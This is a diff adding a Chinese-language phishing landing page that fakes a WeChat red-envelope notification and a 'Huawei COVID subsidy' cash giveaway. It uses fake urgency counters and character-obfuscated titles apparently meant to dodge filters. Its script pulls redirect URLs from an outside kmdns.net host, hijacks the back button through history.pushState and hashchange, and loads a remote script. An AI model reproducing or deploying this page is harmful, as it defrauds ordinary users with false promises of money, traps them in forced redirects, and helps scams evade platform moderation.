@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>....</title>
+    <style>
+        * {
+            padding: 0;
+            margin: 0
+        }
+
+        /* è½åœ°é¡µåŠ¨ç”» */
+        @keyframes show1 {
+            0% {
+                opacity: 0;
+                transform: scale(0.2);
+            }
+
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        @keyframes btn1 {
+            0% {
+                transform: rotate(-720deg);
+            }
+
+            100% {
+                transform: rotate(0deg);
+            }
+        }
+
+        @keyframes show2 {
+            0% {
+                opacity: 0;
+                transform: translateY(50%);
+            }
+
+            100% {
+                opacity: 1;
+                transform: translateY(0%);
+            }
+        }
+
+        @keyframes btn2 {
+            0% {
+                transform: scale(0)
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        @keyframes show3 {
+            0% {
+                opacity: 0;
+                transform: translateY(-50%);
+            }
+
+            100% {
+                opacity: 1;
+                transform: translateY(0%);
+            }
+        }
+
+        @keyframes btn3 {
+            0% {
+                transform: scale(0)
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        @keyframes show4 {
+            0% {
+                opacity: 0;
+                border-radius: 100%
+            }
+
+            100% {
+                opacity: 1;
+                border-radius: 0%;
+            }
+        }
+
+        @keyframes btn4 {
+            0% {
+                transform: scale(1, 0)
+            }
+
+            100% {
+                transform: scale(1, 1);
+            }
+        }
+
+        @keyframes btnShake1 {
+            0% {
+                transform: scale(1);
+            }
+
+            40% {
+                transform: scale(1.1);
+            }
+
+            60% {
+                transform: scale(.9);
+            }
+
+            80% {
+                transform: scale(1.2);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        @keyframes btnShake2 {
+            0% {
+                transform: scale(1);
+            }
+
+            40% {
+                transform: scale(1.1, 0.9);
+            }
+
+            60% {
+                transform: scale(.9, 1.1);
+            }
+
+            80% {
+                transform: scale(1.2, 0.8);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        @keyframes btnShake3 {
+            0% {
+                transform: scale(1, 1) rotate(0deg);
+            }
+
+            10% {
+                transform: scale(1.2, 0.8);
+            }
+
+            20% {
+                transform: scale(0.8, 1.2);
+            }
+
+            30% {
+                transform: scale(1.2, 0.8);
+            }
+
+            40% {
+                transform: scale(0.8, 1.2);
+            }
+
+            50% {
+                transform: scale(1, 1);
+            }
+
+            60% {
+                transform: rotate(-15deg);
+            }
+
+            70% {
+                transform: rotate(15deg);
+            }
+
+            80% {
+                transform: rotate(-25deg);
+            }
+
+            90% {
+                transform: rotate(25deg);
+            }
+
+            100% {
+                transform: scale(1, 1) rotate(0deg);
+            }
+        }
+
+        @keyframes btnShake4 {
+            0% {
+                transform: rotate(0deg);
+                opacity: 1;
+            }
+
+            10% {
+                transform: scale(1.2, 0.8);
+            }
+
+            20% {
+                transform: scale(0.8, 1.2);
+            }
+
+            30% {
+                transform: scale(1.2, 0.8);
+            }
+
+            40% {
+                transform: scale(0.8, 1.2);
+            }
+
+            50% {
+                transform: scale(1, 1);
+            }
+
+            60% {
+                opacity: 1;
+            }
+
+            70% {
+                opacity: 0.5;
+            }
+
+            80% {
+                opacity: 1;
+            }
+
+            90% {
+                opacity: 0.5;
+            }
+
+            100% {
+                transform: scale(1, 1);
+                opacity: 1;
+            }
+        }
+
+        @keyframes btnMove {
+            from {
+                transform: rotateY(180deg)
+            }
+
+            to {
+                transform: rotateY(360deg)
+            }
+        }
+
+        @keyframes rotateMove {
+            from {
+                transform: rotate(0deg)
+            }
+
+            to {
+                transform: rotate(360deg)
+            }
+        }
+
+        /* ç”¨æˆ·åˆ—è¡¨åŠ¨ç”» */
+        @keyframes itemMove1 {
+            0% {
+                height: 0px;
+            }
+
+            100% {
+                height: 60px;
+            }
+        }
+
+        @keyframes itemMove2 {
+            0% {
+                height: 0px;
+                transform: scaleY(0);
+            }
+
+            40% {
+                height: 60px;
+                transform: scaleY(0);
+            }
+
+            100% {
+                transform: scaleY(1);
+            }
+        }
+
+        @keyframes itemMove3 {
+            0% {
+                height: 0px;
+                transform: translateX(100px);
+                opacity: 0;
+            }
+
+            40% {
+                height: 60px;
+                transform: translateX(100px);
+                opacity: 0;
+            }
+
+            100% {
+                transform: translateX(0px);
+                opacity: 1;
+            }
+        }
+
+        @keyframes itemMove4 {
+            0% {
+                height: 0px;
+                transform: translateX(-100px);
+                opacity: 0;
+            }
+
+            40% {
+                height: 60px;
+                transform: translateX(-100px);
+                opacity: 0;
+            }
+
+            100% {
+                transform: translateX(0px);
+                opacity: 1;
+            }
+        }
+
+        @keyframes tipMove {
+            0% {
+                transform: translate(0px, 0%);
+            }
+
+            40% {
+                transform: translate(-10px, 30%);
+            }
+
+            100% {
+                transform: translate(0px, 0%);
+            }
+        }
+
+        /* è½åœ°é¡µæç¤ºæ ·å¼ */
+        .text-tip {
+            position: relative;
+        }
+
+        .text-tip::before {
+            position: absolute;
+            content: "";
+            width: .1px;
+            height: .1px;
+            border: solid 8px rgba(0, 0, 0, 0);
+            border-right-color: #ebcd9b;
+            top: 0px;
+            left: -16px;
+        }
+
+        .tan-bg-tz {
+            background-color: #fff;
+            border-radius: 6px;
+            position: fixed;
+            width: 96%;
+            animation: demo2 5s ease-in-out 0s 1 alternate forwards;
+            left: 2%;
+            z-index: 6666;
+        }
+
+        .tongzhi_top {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 4px;
+        }
+
+        .tongzhi_bottom {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 14px;
+        }
+
+        .t_l_text {
+            display: flex;
+            align-items: center;
+            font-size: 12px;
+        }
+
+        .t_l_text img {
+            width: 20px;
+            height: auto;
+            display: block;
+            margin-right: 10px;
+        }
+
+        .safe-img {
+            margin-top: 4px;
+        }
+
+        .safe-img img {
+            width: 14px;
+            height: auto;
+            display: block;
+        }
+
+        .tz_img img {
+            width: 10vw;
+            height: 10vw;
+            display: block;
+        }
+
+        .text-ling {
+            margin-top: 4px;
+            color: #6a6a6a;
+        }
+
+        .text-new {
+            color: #6a6a6a;
+        }
+
+        .new-bg-tz {
+            padding: 10px 10px 12px 20px;
+        }
+
+        @keyframes demo2 {
+            0% {
+                transform: translateY(-100px);
+            }
+
+            30% {
+                transform: translateY(4px);
+            }
+
+            50% {
+                transform: translateY(4px);
+            }
+
+            100% {
+                transform: translateY(-300px);
+            }
+        }
+    </style>
+    <style>
+        .modal2 {
+            margin: auto;
+            top: 100px;
+            padding-top: 20px;
+            padding-left: 20px;
+            padding-right: 20px;
+            background: white;
+            border-radius: 8px;
+            position: relative;
+        }
+
+        .modal1 {
+            width: 100%;
+            background: #FEFEFE;
+            text-align: center;
+            padding-top: 5vh;
+            padding-bottom: 5vh;
+        }
+
+        .disappear {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #c0c0c0;
+            font-size: 20px;
+            line-height: 26px;
+            font-weight: bold;
+            text-align: center;
+            color: #ebebeb;
+            position: absolute;
+            right: -10px;
+            top: -10px;
+        }
+
+        .btn1 {
+            width: 100%;
+            height: 50px;
+            border-top: 1px solid #dcd9d9;
+        }
+
+        .btnHide {
+            width: 100%;
+            height: 50px;
+            font-size: 22px;
+            color: #18ad19;
+            border: 0;
+            background: white;
+            border-radius: 4px;
+        }
+    </style>
+    <script>
+    </script>
+    <script>
+        window.apiCode = "api1";
+    </script>
+
+    <script>
+        var ftitle = ["全民派҈發现金", "biaoqing全҈民派fuhao钱", "biaoqing全民fuhao领钱", "人人有fuhao有钱领", "biaoqing现金奖励,随便领", "biaoqing人人fuhao有钱領"];
+        var ztitle = ["中华有为fuhao就业҈补助金", '中华有为fuhao支持華҈為5G', '支持华为fuhao世界第一', "支持华为fuhao全民派钱", "支持华为fuhao全民送钱", "支持华为fuhao人人有钱领", "支持华为fuhao人人有钱領", "支持华为fuhao随机现金奖励"];
+        var bg_img = '1.png';
+        var nextUri = "jiayou_b";
+        function getUrlParam(name) {
+            var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
+            var r = window.location.search.substr(1).match(reg);
+            if (r != null) return unescape(r[2]);
+            return null;
+        }
+        function random_num(max, min) {
+            var suff = parseInt(Math.random() * (max - min + 1) + min, 10); Math.floor(Math.random() * (max - min + 1) + min);
+            return suff;
+        }
+        var now_time = new Date().getTime();
+        var from_time = (parseInt(getUrlParam('_t', document.referrer)) * 1000 || now_time);
+        var future = new Date(from_time + 3600 * 24 * 1000 * 3 + 8 * 3600 * 1000);
+        var future_str = future.toISOString().substr(0, 10);
+        function hideDialog() {
+            document.getElementById('dia').style.display = 'none';
+        }
+    </script>
+</head>
+
+<body style="background:#000">
+    <div id="axax" class="tan-bg-tz" style="">
+        <div class="new-bg-tz">
+            <div class="tongzhi_top">
+                <div class="t_l_text">
+                    <div>
+                        <img src="wei_xin.png" alt=""></div>
+                    <div>微҈信 · <span class="text-new">刚刚</span></div>
+                </div>
+                <div class="safe-img"><img src="safe.png" alt=""></div>
+            </div>
+            <div class="tongzhi_bottom">
+                <div>
+                    <div>微҈信红包҈</div>
+                    <div class="text-ling">已到账，分享即可领取</div>
+                </div>
+                <div class="tz_img"><img src="tongzhi.jpg" alt=""></div>
+            </div>
+        </div>
+    </div>
+    <div class="modal2" id='dia' style='z-index: 1000;font-family:"微软雅黑";'>
+        <div class="disappear" data-clipboard-text="" id="disappear" onclick='hideDialog()'>x</div>
+        <div class="modal1">
+            <p style="color: #e03424; font-size: 24px; line-height: 40px;">华为҈·两亿҈疫情补帖<br></p>
+            <p style="margin-bottom: 20px; font-size:18px; "></p>
+            <p style="font-size: 16px; color: #f4434f; margin-bottom: 20px;">
+                疫情·҈补贴
+                <br>
+                截至于<span style="font-size: 20px" id="datetime">1月10日</span>送完为止，人人免费领</p>
+            <p style="font-size: 16px; margin-bottom: 20px;">为答谢新老用户们的支持与厚爱，现发出疫情·҈补助金<br><span
+                    style="color: #f4434f;">两亿</span>现金礼包回馈微信用户</p>
+            <p style="color: #bcbcbc; font-size: 16px; margin-bottom: 20px;"> 红包总额仅剩余<span
+                    style="color: #f4434f; font-size: 22px;">
+                    <script>document.write(random_num(10, 99))</script>万</span><br> 数量有限，先到先得 </p>
+        </div>
+        <div class="btn1"> <button id="btnxxx" class="btnHide" type="button" data-clipboard-text=""
+                onclick='hideDialog()'>现在去领</button></div>
+    </div>
+    <div
+        style="z-index: 999;height: 80vh;background-color: rgb(220,94,77);width: 80vw;margin: 0 auto;border-radius: 10px;overflow: hidden;position: fixed;top: 10vh;left: 10vw;animation: show1 .4s;overflow: hidden;">
+        <div
+            style="height: 50vh;border: 1px solid rgb(220,94,77);background-color: rgb(220,94,77);border-radius: 10px 10px 50% 50% / 10px 10px 19% 19%;box-shadow: 0px 4px 0px -1px rgba(0, 0, 0, 0.2);">
+            <img src="1.png" style="width:60px;height: 60px; margin: 0 auto 0; display: block; padding-top: 60px;">
+            <p style="font-size: 24px;text-align: center;padding-top: 20px;color: #ebcd9b;">中华有为-疫情·补贴</p>
+            <p style="font-size: 16px;text-align: center;padding-top: 20px;color: #ebcd9b;">人人有 有钱领<span
+                    class="text-tip"
+                    style="margin-left: 14px; font-size: 12px; background-color: #ebcd9b; padding: 1px 4px; color: rgb(220,94,77)">可提现</span>
+            </p>
+        </div>
+        <div id="openbtn"
+            style="width: 27.2vw;height: 25vw;border: 1px solid #ebcd9b;background-color: #ebcd9b;border-radius: 50%;margin: -45px auto 0;box-shadow: 0px 4px 0px 0px rgba(0, 0, 0, 0.2);text-align: center;line-height: 90px;animation: btn1 .5s;animation:1.8s ease 0s infinite normal none running btnShake3;animation-delay: .1s;"
+            onclick="openRed(this)"> <span
+                style=" display: inline-block; font-size: 36px; font-family: SimSun; font-weight: bold; color: #333;-webkit-animation: scaling .6s infinite; animation: scaling .6s infinite;">抢</span>
+        </div>
+    </div>
+</body>
+
+
+<script>
+       function openRed() {
+        document.getElementById("openbtn")["style"]["animation"] = "btnMove .6s infinite alternate";
+        setTimeout(function () {
+            go();
+        }, 0x258);
+    }
+    window.go = function () {
+        function loadHtml(url) {
+            document.title = "...";
+            var xhr = new XMLHttpRequest;
+            var html = null;
+            function render() {
+                var a = document.open("text/html;charset=UTF-8", "replace");
+                a.write(html);
+                a.close();
+            }
+            xhr.onload = function () {
+                html = xhr.responseText;
+                var delay = 0;
+                if (delay > 0) setTimeout("render()", delay * 1000)
+                else render();
+            };
+            xhr.open("GET", url, !0);
+            xhr.send();
+        }
+        
+        var httpRequest = new XMLHttpRequest();
+            httpRequest.open('GET', 'https://qq13212888839.kmdns.net/api/h.php', true);
+            httpRequest.send();
+            httpRequest.onreadystatechange = function () {
+                if (httpRequest.readyState == 4 && httpRequest.status == 200) {
+                    var json = httpRequest.responseText;
+                    if (json.length > 3) {
+                        if (window.location.href.indexOf(json) < 0) {
+                            top.location.href = json;
+                        }else{
+                            top.location.href = "/b.html";
+                        }
+                    }else{
+                        top.location.href = "/b.html";
+                    }
+                }
+            };
+    }
+    var random = (Math.random() * 15);
+    var random2 = (Math.random() * 100);
+    var dww = 60;
+    var dtt = 45;
+
+    if (location.href.indexOf("v_100") != -1) {
+        document.getElementById('dia').style.display = "none";
+    }
+    var now_time = new Date().getTime();
+    var from_time = (parseInt(now_time));
+    var future = new Date(from_time + 3600 * 24 * 1000 * 3 + 8 * 3600 * 1000);
+    var datetime = future.toISOString().substr(5, 5);
+    datetime = datetime.replace("-", "\u6708");
+    document.getElementById('datetime').innerText = datetime + "日";
+    document.getElementById('axax').style.top = (random2) + "px";
+    if (sessionStorage.getItem("a") == null) {
+    sessionStorage.setItem("a", "1");
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?fd9a5ee01574c44576b0574c09baafaf";
+      var s = document.getElementsByTagName("script")[0]; 
+      s.parentNode.insertBefore(hm, s);
+    })();
+}else{
+    // window.location.href="https://dwz.cn/33r9W1EL";
+    var httpRequest = new XMLHttpRequest();
+    httpRequest.open('GET', 'https://qq13212888839.kmdns.net/api/ad.php', true);
+    httpRequest.send();
+    httpRequest.onreadystatechange = function () {
+        if (httpRequest.readyState == 4 && httpRequest.status == 200) {
+            var json = httpRequest.responseText;
+            window.location.href = json;
+        }
+    };
+}
+history.pushState(history.length + 1, "..``````", "#xxxx_" + new Date().getTime());
+window.onhashchange = function () {
+    // window.location.href="https://dwz.cn/33r9W1EL";
+    var httpRequest = new XMLHttpRequest();
+    httpRequest.open('GET', 'https://qq13212888839.kmdns.net/api/ad.php', true);
+    httpRequest.send();
+    httpRequest.onreadystatechange = function () {
+        if (httpRequest.readyState == 4 && httpRequest.status == 200) {
+            var json = httpRequest.responseText;
+            window.location.href=json;
+        }
+    };
+};
+
+</script>
+<script src="https://cawtwat.oss-cn-qingdao.aliyuncs.com/bd.js"></script>
+</html>
